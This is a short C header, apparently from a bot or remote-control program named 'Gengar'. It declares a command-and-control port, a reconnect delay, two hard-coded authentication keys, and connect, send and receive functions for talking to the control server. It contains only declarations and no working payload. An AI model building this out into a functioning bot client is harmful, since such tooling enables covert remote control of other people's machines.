#include <stdio.h>

#define CNC_PORT "5000"
#define SLEEP_INTERVAL_ON_CONNREFUSED_MS 30 * 1000

#define GENGAR_KEY "4be166c8-5aa2-4db2-90a1-446aacd14d32"
#define CNC_KEY "b6c077c1-12d1-4dbb-8786-d22a7090bfae"
#define AUTH_KEY_LEN 36

void cnc_init_conn();
int cnc_send(void *buf, size_t len);
int cnc_recv(void *buf, size_t len);
int cnc_recvall(void *buf, size_t len);